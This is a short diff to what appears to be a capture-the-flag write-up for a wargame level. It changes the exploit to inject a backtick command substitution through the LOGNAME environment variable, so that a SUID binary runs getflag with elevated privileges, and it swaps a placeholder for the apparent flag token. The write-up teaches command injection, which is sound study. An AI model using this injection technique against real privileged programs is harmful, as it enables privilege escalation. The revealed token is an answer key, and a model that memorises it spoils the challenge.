@@ -73,14 +73,14 @@ Wait — that would just print the word `getflag`. We need to **break out of the
 ### The Exploit
 
 ```bash
-export LOGNAME="; getflag"
+export LOGNAME='`getflag`'
 ./level07
 ```
 
 The constructed command becomes:
 
 ```bash
-/bin/echo ; getflag
+/bin/echo `getflag`
 ```
 
 Since the binary runs as `flag07` (thanks to SUID), `getflag` is executed with `flag07`'s privileges and prints the flag. 
@@ -90,7 +90,7 @@ Since the binary runs as `flag07` (thanks to SUID), `getflag` is executed with `
 ## Result
 
 ```
-Check flag.Here is your token: <FLAG>
+Check flag.Here is your token: fiumuikeil55xe9cu4dood66h
 ```
 
 ---
